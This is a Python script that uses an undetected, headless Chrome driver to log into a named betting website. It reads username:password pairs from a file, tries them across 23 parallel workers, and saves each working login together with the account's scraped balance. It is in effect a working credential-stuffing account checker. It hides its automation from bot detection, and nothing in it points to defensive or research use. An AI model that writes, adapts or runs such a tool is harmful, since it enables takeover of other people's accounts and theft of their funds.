import re
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import undetected_chromedriver as uc
import time
import traceback
import os
from concurrent.futures import ThreadPoolExecutor

def read_credentials(file_path):
    """Reads a file with each line in the format username:password."""
    with open(file_path, 'r', encoding='utf-8') as file:
        credentials = file.readlines()
    return [line.strip().split(':') for line in credentials]

def init_driver(block_images=True):
    """Initialize an undetected Chrome WebDriver with specified options."""
    options = uc.ChromeOptions()
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--log-level=3")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--headless=new")  # <-- Headless mode here

    if block_images:
        prefs = {"profile.managed_default_content_settings.images": 2}
        options.add_experimental_option("prefs", prefs)

    version_main = 139

    driver = uc.Chrome(options=options, version_main=version_main)
    driver.set_window_size(1920, 1080)  # Important for rendering layout in headless mode
    return driver

def login(credentials):
    """Perform the login process for a single username/password pair."""
    username, password = credentials
    driver = init_driver()

    try:
        driver.get(login_page_url)
        wait = WebDriverWait(driver, 30)
        
        # Step 1: Accept Cookies
        try:
            accept_cookies_btn = wait.until(
                EC.presence_of_element_located((By.CSS_SELECTOR, '[data-qid="accept-cookies"]'))
            )
            try:
                accept_cookies_btn.click()
            except Exception:
                # Fallback to JavaScript click
                driver.execute_script("arguments[0].click();", accept_cookies_btn)
            # print(f"[INFO] Cookies accepted for {username}.")
        except Exception:
            print(f"[WARNING] Accept Cookies button not found or not clickable for {username}. Continuing...")

        # Step 2: Click Login Button to Open Login Window
        try:
            login_button = wait.until(
                EC.element_to_be_clickable((By.XPATH, "/html/body/div[2]/div[2]/div/nav/div/div/div[3]/div[3]/div[2]"))
            )
            login_button.click()
            # print(f"[INFO] Login window opened for {username}.")
        except Exception:
            # print(f"[ERROR] Login button not found or not clickable for {username}.")
            return

        # Step 3: Fill in the Username
        try:
            username_field = wait.until(
                EC.visibility_of_element_located(
                    (By.XPATH, "/html/body/div[2]/div[2]/div[2]/div/div/div/div/div/form/div[1]/div/div/div/input")
                )
            )
            username_field.send_keys(username)
            # print(f"[INFO] Username entered for {username}.")
        except Exception:
            # print(f"[ERROR] Username field not found for {username}.")
            return

        # Step 4: Fill in the Password
        try:
            password_field = wait.until(
                EC.visibility_of_element_located(
                    (By.XPATH, "/html/body/div[2]/div[2]/div[2]/div/div/div/div/div/form/div[2]/div/div/div/input")
                )
            )
            password_field.send_keys(password)
            # print(f"[INFO] Password entered for {username}.")
        except Exception:
            # print(f"[ERROR] Password field not found for {username}.")
            return

        # Step 5: Click the Login Button
        try:
            submit_button = wait.until(
                EC.element_to_be_clickable(
                    (By.XPATH, "/html/body/div[2]/div[2]/div[2]/div/div/div/div/div/form/button")
                )
            )
            submit_button.click()
            # print(f"[INFO] Login button clicked for {username}.")
        except Exception:
            # print(f"[ERROR] Submit button not found or not clickable for {username}.")
            return

        # Step 6: Verify Login Success and Extract Amount
        try:
            success_elm = wait.until(
                EC.visibility_of_element_located(
                    (By.CSS_SELECTOR, "div.d-flex-as-je.nav-user.nav-user__logged-in")
                )
            )
            success_text = success_elm.text
            # Extract numerical amount, handling both dots and commas
            amount_match = re.search(r'\d+(?:[.,]\d+)?', success_text)
            if amount_match:
                amount_str = amount_match.group().replace(',', '.')  # Standardize to dot
                try:
                    amount = float(amount_str)
                    success_text = f"{amount:.2f}"  # Format to 2 decimal places
                except ValueError:
                    success_text = '0.00'
            else:
                success_text = '0.00'
            print(f"[SUCCESS] Login successful for {username} - Data: {success_text}")

            with open(success_logins_file, 'a', encoding='utf-8') as file:
                file.write(f"{username}:{password} - {success_text}\n")

        except Exception:
            print(f"[INFO] Success element NOT found for {username}.")
            # print(f"[ERROR] Login probably failed for {username}.")

    except Exception as e:
        traceback.print_exc()
        # print(f"[ERROR] Exception for {username}: {e}")

    finally:
        driver.quit()

def main():
    global login_page_url, success_logins_file

    credentials_file = 'credentials.txt'
    success_logins_file = r"C:\Users\patri\Desktop\inbet\successful_logins_with_data.txt"
    os.makedirs(os.path.dirname(success_logins_file), exist_ok=True)

    login_page_url = "https://www.inbet.com/"
    # Note: success_selector is defined but unused; selector is hardcoded in login()

    credentials = read_credentials(credentials_file)
    max_workers = 23  # Increase if concurrency is desired, but test carefully
    # print(f"Starting login attempts with concurrency = {max_workers} ...")

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        executor.map(login, credentials)

if __name__ == "__main__":
    main()

    